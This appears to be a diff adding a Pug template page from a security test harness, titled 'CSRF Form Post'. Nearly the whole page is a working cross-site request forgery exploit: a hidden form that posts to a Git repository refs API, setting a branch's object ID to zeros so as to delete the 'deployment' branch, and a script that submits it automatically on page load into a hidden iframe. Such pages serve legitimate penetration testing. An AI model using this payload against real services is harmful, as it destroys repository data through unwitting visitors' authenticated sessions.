@@ -1,0 +1,36 @@
+extends layout
+
+block content
+  include partials/attacknav
+  script(src='/js/lib/jquery-3.1.1.min.js')
+  .page-header
+    h3 CSRF Form Post
+
+  h3 CSRF attack against a controller that doesn't specify content type restriction
+  div.csrfContainer hello 
+  -
+    var repoId = "b464143e-a69b-4893-addd-29ccf6b0026e";
+    var accountName = "test";
+    var oldObjectId = '9cf0e626d95c090e02e0dd6253f5e1cb27a5d201';
+    var name = 'refs/heads/deployment';
+
+    var branchDeletionUrl = "https://{accountName}.me.tfsallin.net:444/_apis/git/Repositories/{repoId}/refs2?api-version=4.0-preview.1";
+    branchDeletionUrl = branchDeletionUrl.replace(/{repoId}/g, repoId);
+    branchDeletionUrl = branchDeletionUrl.replace(/{accountName}/, accountName);
+
+  iframe.csrf(name='csrf-frame')
+  form.csrf(action=branchDeletionUrl, method='post', id='csrf-form', target='csrf-frame')
+    input(type="text", name="refUpdates[0][newObjectId]", value='0000000000000000000000000000000000000000')
+    input(type="text", name="refUpdates[0][oldObjectId]", value=oldObjectId)
+    input(type="text", name="refUpdates[0][name]", value=name)
+    input(type="submit", value="submit")
+  script document.getElementById('csrf-form').submit();
+  
+  
+
+
+
+
+
+
+  
